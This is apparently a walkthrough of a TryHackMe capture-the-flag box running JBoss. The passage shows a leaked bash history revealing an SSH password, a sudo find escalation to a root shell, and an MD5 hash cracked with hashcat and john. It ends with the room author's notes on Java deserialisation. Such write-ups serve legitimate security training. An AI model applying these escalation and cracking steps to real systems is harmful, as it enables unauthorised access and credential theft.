cmnatic@thm-java-deserial:~$ cat .bash_history
sudo apt-get update && sudo apt-get upgrade
mkdir /mnt/cdrom
sudo mkdir /mnt/cdrom
sudo mount /dev/cdrom /mnt/cdrom/
cd /mnt/cdrom/
ls
cp VMwareTools-10.3.10-13959562.tar.gz ~/
cd ~/
tar -zxvf VMwareTools-10.3.10-13959562.tar.gz 
cd vmware-tools-distrib/
ls
chmod +x vmware-install.pl 
./vmware-install.pl 
sudo ./vmware-install.pl 
sudo apt-get install screen wget curl
sudo apt-get install openjdk-7-jre
sudo apt-get install openjdk-7-jdk
sudo update-alternatives --config java
java --home
java --version
java -V
sudo update-alternatives --config java
sudo nano /etc/environment 
sudo reboot
sudo apt-get install htop zip unzip
ls
cd jboss/
ls
wget https://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip
ls
unzip jboss-as-distribution-6.1.0.Final.zip 
ls
mv jboss-6.1.0.Final jboss
rm *.zip
rm *.tar.gz
sudo rm *.tar.gz
ls
rm -R vmware-tools-distrib/
sudo rm -R vmware-tools-distrib/
cd jboss/
ls
cd bin/
ls
chmod +x run.sh 
./run.sh -b 0.0.0.0
ls /usr/lib/jvm/java-7-openjdk-amd64/jre/bin
ls /usr/lib/jvm/java-7-openjdk-amd64/jre/bin/java
sudo nano /etc/environment 
source /etc/environment
./run.sh -b 0.0.0.0
ls
nano README-service.txt 
sudo nano /etc/environment 
cd ~
nano .bashrc 
source .bashrc 
echo $PATH
echo $JBOSS_HOME
nano .bashrc 
logout
echo $JBOSS_HOME
ls
cd jboss/
ls
cd bin/
ls
sudo nano /etc/init.d/jboss
chmod 755 /etc/rc.d/init.d/jboss
sudo cp /etc/rc.d/init.d/jboss /etc/rc.d/init.d/jboss
chmod 755 /etc/init.d/jboss
sudo chmod 755 /etc/init.d/jboss
jboss start
sudo chkconfig --add jboss
/etc/init.d/jboss start
sudo nano /etc/init.d/jboss
jboss start
/etc/init.d/jboss start
ls
sudo nano /etc/init.d/jboss
/etc/init.d/jboss start
ls
sudo nano /etc/init.d/jboss
ls
nano jboss_init_redhat.sh 
ps aux | grep jboss
cd init.d
cd ../
ls
cd server/
ls
cd jbossweb-standalone/
ls
cd ../../
cd /etc/default/
ls
cd ../
nano /etc/init.d/jboss 
sudo nano /etc/init.d/jboss 
jboss start
/etc/init.d/jboss start
ls /home/cmnatic/jboss/bin
sudo nano /etc/init.d/jboss 
echo "I see you peeping!"
/etc/init.d/jboss start
sudo nano /etc/init.d/jboss 
sudo /etc/init.d/jboss start
sudo nano /etc/init.d/jboss 
sudo /etc/init.d/jboss start
sudo nano /etc/init.d/jboss 
sudo /etc/init.d/jboss start
ls /home/cmnatic/jboss/bin/
chmod +x /home/cmnatic/jboss/bin/run.sh 
sudo /etc/init.d/jboss start
sudo nano /etc/init.d/jboss 
sudo /etc/init.d/jboss start
ps aux | grep jboss
sudo nano /etc/init.d/jboss stop
cd /home/cmnatic/jboss/bin/
ls
echo "I see you peeping! You're on the right lines..."
nano run.sh 
nano run.conf
sudo nano /etc/init.d/jboss stop
sudo /etc/init.d/jboss stop
sudo nano /etc/init.d/jboss
run.sh -c -b 0.0.0.0
sudo nano /etc/init.d/jboss
run.sh -b 0.0.0.0 -c
sudo nano /etc/init.d/jboss
run.sh -b 0.0.0.0 &
ls
nano run.sh 
ls /home
nano .bash_history 
su -l root
exit
import TERM=xterm
SHELL=/bin/bash script -q /dev/null

jboss: likeaboss

┌──(kali㉿kali)-[~]
└─$ ssh jboss@10.10.112.241             
The authenticity of host '10.10.112.241 (10.10.112.241)' can't be established.
ED25519 key fingerprint is SHA256:vyntdEjxp6aE/lZ35pCYGR3J8QxXrzUpj9eWpK+qCP8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.112.241' (ED25519) to the list of known hosts.
jboss@10.10.112.241's password: likeaboss
Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

  System information as of Wed Dec 28 21:41:52 GMT 2022

  System load:  0.47               Processes:           107
  Usage of /:   10.5% of 18.58GB   Users logged in:     0
  Memory usage: 4%                 IP address for eth0: 10.10.112.241
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Your Hardware Enablement Stack (HWE) is supported until April 2019.
Last login: Sat Mar  7 00:35:29 2020
jboss@thm-java-deserial:~$ whoami
jboss
jboss@thm-java-deserial:~$ find / -perm -4000 2>/dev/null | xargs ls -lah
-rwsr-xr-x 1 root    root        31K May 15  2015 /bin/fusermount
-rwsr-xr-x 1 root    root        93K Nov 23  2016 /bin/mount
-rwsr-xr-x 1 root    root        44K May  7  2014 /bin/ping
-rwsr-xr-x 1 root    root        44K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root    root        37K May 17  2017 /bin/su
-rwsr-xr-x 1 root    root        68K Nov 23  2016 /bin/umount
-rwsr-sr-x 1 daemon  daemon      51K Oct 21  2013 /usr/bin/at
-rwsr-xr-x 1 root    root        46K May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root    root        41K May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root    root        71K May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root    root        74K Oct 21  2013 /usr/bin/mtr
-rwsr-xr-x 1 root    root        36K May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root    root        46K May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root    root        23K Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root    root       152K May 29  2017 /usr/bin/sudo
-rwsr-xr-x 1 root    root        23K May  7  2014 /usr/bin/traceroute6.iputils
-rwsr-xr-- 1 root    messagebus 304K Dec  7  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root    root        10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root    root       431K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root    root        15K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-r-sr-xr-x 1 root    root        14K Mar  4  2020 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-r-sr-xr-x 1 root    root        14K Mar  4  2020 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-rwsr-xr-- 1 root    dip        340K Jun 12  2018 /usr/sbin/pppd
-rwsr-sr-x 1 libuuid libuuid     19K Nov 23  2016 /usr/sbin/uuidd

jboss@thm-java-deserial:~$ sudo -l
Matching Defaults entries for jboss on thm-java-deserial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jboss may run the following commands on thm-java-deserial:
    (ALL) NOPASSWD: /usr/bin/find

jboss@thm-java-deserial:~$ sudo find . -exec /bin/sh \; -quit
# cat /root/root.txt
QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==

# cd /home/tony
# ls
# ls -lah
total 36K
drwxr-xr-x 3 tony tony 4.0K Mar  6  2020 .
drwxr-xr-x 5 root root 4.0K Mar  6  2020 ..
-rw------- 1 tony tony  341 Mar  7  2020 .bash_history
-rw-r--r-- 1 tony tony  220 Mar  6  2020 .bash_logout
-rw-r--r-- 1 tony tony 3.6K Mar  6  2020 .bashrc
drwx------ 2 tony tony 4.0K Mar  6  2020 .cache
-rw------- 1 tony tony   10 Mar  7  2020 .nano_history
-rw-r--r-- 1 tony tony  675 Mar  6  2020 .profile
-rw------- 1 tony tony   63 Mar  6  2020 .Xauthority
# cat .bash_history
cd /var/www/html
ls
cd  posts/
ls
nano frosted-flakes/index.html 
nano my-first-post/index.html 
nano frosted-flakes/index.html 
nano my-first-post/index.html 
cd ../
ls
nano index.html 
cd ~/
exit
cd /var/www/html
ls
exit
nano /var/www/html/posts/frosted-flakes/
nano /var/www/html/posts/frosted-flakes/index.html 
nano .bash_history 
exit

# cat /root/root.txt | base64 -d
BC77AC072EE30E3760806864E234C7CF

using crackstation

zxcvbnm123456789

or hashcat

┌──(kali㉿kali)-[~/tony_tiger]
└─$ hashcat -m 0 -a 0 hash_tiger /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 1240/2545 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

bc77ac072ee30e3760806864e234c7cf:zxcvbnm123456789         
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: bc77ac072ee30e3760806864e234c7cf
Time.Started.....: Wed Dec 28 17:36:27 2022 (1 sec)
Time.Estimated...: Wed Dec 28 17:36:28 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1221.7 kH/s (0.13ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 231424/14344385 (1.61%)
Rejected.........: 0/231424 (0.00%)
Restore.Point....: 230400/14344385 (1.61%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 092496 -> youngc1
Hardware.Mon.#1..: Util: 38%

Started: Wed Dec 28 17:35:49 2022
Stopped: Wed Dec 28 17:36:30 2022

or john

┌──(kali㉿kali)-[~/tony_tiger]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_tiger --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
zxcvbnm123456789 (?)     
1g 0:00:00:00 DONE (2022-12-28 17:37) 33.33g/s 7712Kp/s 7712Kc/s 7712KC/s 010325..zach2008
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 

```

*zxcvbnm123456789*


### Final Remarks, Credits & Further Reading

Final Remarks

I hope this was a refreshing CTF, where classic techniques meet new content on THM - all of which are not based around Metasploit!

This type of attack can prove to be extremely dangerous - as you'd hopefully have discovered by now. It's still very real as _sigh,_ java web applications are still used day-to-day. Because of their nature, "Serialisation" attacks all execute server-side, and as such - it results in being very hard to prevent from Firewalls / IDS' / IPS'.

For any and all feedback, questions, problems or future ideas you'd like to be covered, [please get in touch in the TryHackMe Discord (following Rule #1)](https://discord.gg/QgC6Tdk)  

So long and thanks for all the fish!

~[CMNatic](https://tryhackme.com/p/cmnatic)

Credits

Again, to reiterate, the provided downloadable material has only slightly been adapted to ensure compatibility for all users across TryHackMe. Generating and executing the payload especially is very user-environment dependant (i.e. Java versions, of which are hard to manage on Linux, etc...)

Many thanks to [byt3bl33d3r](https://github.com/byt3bl33d3r) for providing a reliable Proof of Concept, and finally to all the contributors towards [Frohoff's Ysoserial](https://github.com/frohoff/ysoserial) which facilitates the payload generation used for this CVE.

https://github.com/frohoff/ysoserial
  

Further Reading

﻿If you are curious into the whole "Serialisation" and "De-Serialisation" process and how it can be exploited, I recommend the following resources:

-   [https://www.baeldung.com/java-serialization](https://www.baeldung.com/java-serialization)[](https://www.baeldung.com/java-serialization)
-   [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)[](http://frohoff.github.io/appseccali-marshalling-pickles/)
-   [https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)[](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)
-   [https://www.darkreading.com/informationweek-home/why-the-java-deserialization-bug-is-a-big-deal/d/d-id/1323237](https://www.darkreading.com/informationweek-home/why-the-java-deserialization-bug-is-a-big-deal/d/d-id/1323237)  
    

Answer the questions below

TIL!


[[Thompson]]